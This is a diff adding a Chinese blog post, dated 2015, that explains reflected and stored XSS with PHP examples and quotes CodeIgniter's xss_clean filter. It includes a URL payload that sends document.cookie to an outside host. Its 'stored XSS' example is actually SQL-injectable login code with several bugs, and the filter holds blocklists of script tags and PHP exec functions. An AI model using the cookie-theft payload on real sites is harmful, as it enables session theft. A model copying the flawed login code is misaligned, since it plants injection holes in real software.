@@ -82,6 +82,336 @@
       
   <header class="page-header">
     
+      <h1 class="entry-title"><a href="/blog/2015/06/25/php003/">Xss攻击</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-25T13:25:55+08:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:25 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h2>什么是xss</h2>
+
+<p>xss 表示cross site scripting（跨站脚本攻击）
+一般分为两中类型
+1：非持久型攻击
+2：持久型攻击</p>
+
+<h3>例如:</h3>
+
+<figure class='code'><figcaption><span>非持久型 </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>非持久型攻击是一次性的，仅对当前的页面访问产生影响
+</span><span class='line'>$name = $_GET['name'];
+</span><span class='line'>echo "welcome $name";
+</span><span class='line'>echo "&lt;a href='http://www.baidu.com'>click to down&lt;/a>";
+</span><span class='line'>攻击者可以通过下面url链接
+</span><span class='line'>index.php?name=guest&lt;script>alert('test')&lt;/script>
+</span><span class='line'>index.php?name=guest&lt;script>new Image().src="http://mytest.com/?"+document.cookie&lt;/script></span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>持久型 </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>持久型xss攻击会把攻击者的数据存储在服务器端，攻击行为将伴随者攻击数据一直存在
+</span><span class='line'>$host = '192.168.1.8';
+</span><span class='line'>$dbname = 'app';
+</span><span class='line'>$user = 'yyy';
+</span><span class='line'>$password = 'xxx';
+</span><span class='line'>$schema = 'test';
+</span><span class='line'>$conection_string = "host=$host dbname=$dbname user=$user password=$password";
+</span><span class='line'>$connect = pg_connect($conection_string,$PGSQL_CONNECT_NEW);
+</span><span class='line'>if(!Connect){
+</span><span class='line'>  echo 'database connection failure';
+</span><span class='line'>  exit;
+</span><span class='line'>}
+</span><span class='line'>$query = "select user_name,password from $schema.members where user_name'".$_POST['user_name']."'";
+</span><span class='line'>$result = pg_query($connect,$query);
+</span><span class='line'>$row = pg_fetch_array($result,NULL,PGSOL_ASSOC);
+</span><span class='line'>$user_pass = md5($_POST['pass_word']);
+</span><span class='line'>$user_name = $row['user_name'];
+</span><span class='line'>if(strcmp($user_pass,$row['password']!=0)){
+</span><span class='line'>  echo "Login failed";
+</span><span class='line'>}else{
+</span><span class='line'>  session_start();
+</span><span class='line'>  $_SESSION['USER_NAME'] = $user_name;
+</span><span class='line'>  echo "&lt;head>&lt;meta http-equiv=\"Refresh\" content=\"0;url=home.php\">&lt;/head>";
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>预防措施</h2>
+
+<figure class='code'><figcaption><span>cookie </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>如保存用户登录状态的cookie，设置httponly，php的setcookie函数最后一个参数即可设置
+</span><span class='line'>setcookie(name,value,expire,path,domain,secure)
+</span><span class='line'>name:cookie的名称 
+</span><span class='line'>value：cookie的值
+</span><span class='line'>expire：cookie的有效期
+</span><span class='line'>path：cookie的服务器路径
+</span><span class='line'>domain：cookie的域名
+</span><span class='line'>secure：规定是否通过安全的https链接来传输cookie</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>输入检查 </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>不要让用户写入任何script和发起恶意http请求的东西
+</span><span class='line'>htmlspecialchars处理</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>防止xss攻击（不是我写的）</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>function xss_clean($str, $is_image = FALSE)
+</span><span class='line'>{
+</span><span class='line'>  if (is_array($str))
+</span><span class='line'>  {
+</span><span class='line'>      while (list($key) = each($str))
+</span><span class='line'>      {
+</span><span class='line'>          $str[$key] = $this->xss_clean($str[$key]);
+</span><span class='line'>      }
+</span><span class='line'>
+</span><span class='line'>      return $str;
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>  $str = remove_invisible_characters($str);
+</span><span class='line'>
+</span><span class='line'>  $str = $this->_validate_entities($str);
+</span><span class='line'>
+</span><span class='line'>  $str = rawurldecode($str);
+</span><span class='line'>
+</span><span class='line'>  $str = preg_replace_callback("/[a-z]+=([\'\"]).*?\\1/si", array($this, '_convert_attribute'), $str);
+</span><span class='line'>
+</span><span class='line'>  $str = preg_replace_callback("/&lt;\w+.*?(?=>|&lt;|$)/si", array($this, '_decode_entity'), $str);
+</span><span class='line'>
+</span><span class='line'>  $str = remove_invisible_characters($str);
+</span><span class='line'>  if (strpos($str, "\t") !== FALSE)
+</span><span class='line'>  {
+</span><span class='line'>      $str = str_replace("\t", ' ', $str);
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>  $converted_string = $str;
+</span><span class='line'>
+</span><span class='line'>  $str = $this->_do_never_allowed($str);
+</span><span class='line'>
+</span><span class='line'>  if ($is_image === TRUE)
+</span><span class='line'>  {
+</span><span class='line'>      $str = preg_replace('/&lt;\?(php)/i', "&lt;?\\1", $str);
+</span><span class='line'>  }
+</span><span class='line'>  else
+</span><span class='line'>  {
+</span><span class='line'>      $str = str_replace(array('&lt;?', '?'.'>'),  array('&lt;?', '?&gt;'), $str);
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>  $words = array(
+</span><span class='line'>      'javascript', 'expression', 'vbscript', 'script', 'base64',
+</span><span class='line'>      'applet', 'alert', 'document', 'write', 'cookie', 'window'
+</span><span class='line'>  );
+</span><span class='line'>
+</span><span class='line'>  foreach ($words as $word)
+</span><span class='line'>  {
+</span><span class='line'>      $temp = '';
+</span><span class='line'>
+</span><span class='line'>      for ($i = 0, $wordlen = strlen($word); $i &lt; $wordlen; $i++)
+</span><span class='line'>      {
+</span><span class='line'>          $temp .= substr($word, $i, 1)."\s*";
+</span><span class='line'>      }
+</span><span class='line'>
+</span><span class='line'>      $str = preg_replace_callback('#('.substr($temp, 0, -3).')(\W)#is', array($this, '_compact_exploded_words'), $str);
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>  do
+</span><span class='line'>  {
+</span><span class='line'>      $original = $str;
+</span><span class='line'>
+</span><span class='line'>      if (preg_match("/&lt;a/i", $str))
+</span><span class='line'>      {
+</span><span class='line'>          $str = preg_replace_callback("#&lt;a\s+([^>]*?)(>|$)#si", array($this, '_js_link_removal'), $str);
+</span><span class='line'>      }
+</span><span class='line'>
+</span><span class='line'>      if (preg_match("/&lt;img/i", $str))
+</span><span class='line'>      {
+</span><span class='line'>          $str = preg_replace_callback("#&lt;img\s+([^>]*?)(\s?/?>|$)#si", array($this, '_js_img_removal'), $str);
+</span><span class='line'>      }
+</span><span class='line'>
+</span><span class='line'>      if (preg_match("/script/i", $str) OR preg_match("/xss/i", $str))
+</span><span class='line'>      {
+</span><span class='line'>          $str = preg_replace("#&lt;(/*)(script|xss)(.*?)\>#si", '[removed]', $str);
+</span><span class='line'>      }
+</span><span class='line'>  }
+</span><span class='line'>  while($original != $str);
+</span><span class='line'>
+</span><span class='line'>  unset($original);
+</span><span class='line'>  $str = $this->_remove_evil_attributes($str, $is_image);
+</span><span class='line'>  $naughty = 'alert|applet|audio|basefont|base|behavior|bgsound|blink|body|embed|expression|form|frameset|frame|head|html|ilayer|iframe|input|isindex|layer|link|meta|object|plaintext|style|script|textarea|title|video|xml|xss';
+</span><span class='line'>  $str = preg_replace_callback('#&lt;(/*\s*)('.$naughty.')([^>&lt;]*)([>&lt;]*)#is', array($this, '_sanitize_naughty_html'), $str);
+</span><span class='line'>  $str = preg_replace('#(alert|cmd|passthru|eval|exec|expression|system|fopen|fsockopen|file|file_get_contents|readfile|unlink)(\s*)\((.*?)\)#si', "\\1\\2&#40;\\3&#41;", $str);
+</span><span class='line'>
+</span><span class='line'>  $str = $this->_do_never_allowed($str);
+</span><span class='line'>
+</span><span class='line'>  if ($is_image === TRUE)
+</span><span class='line'>  {
+</span><span class='line'>      return ($str == $converted_string) ? TRUE: FALSE;
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>  log_message('debug', "XSS Filtering completed");
+</span><span class='line'>  return $str;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header class="page-header">
+    
       <h1 class="entry-title"><a href="/blog/2015/06/19/other001/">H5的兼容问题</a></h1>
     
     
@@ -651,6 +981,10 @@
     <section class="well">
   <ul id="recent_posts" class="nav nav-list">
     <li class="nav-header">Recent Posts</li>
+    
+      <li class="post">
+        <a href="/blog/2015/08/10/linux/">redis之通用key</a>
+      </li>
     
       <li class="post">
         <a href="/blog/2015/08/10/linux/">redis之安装</a>
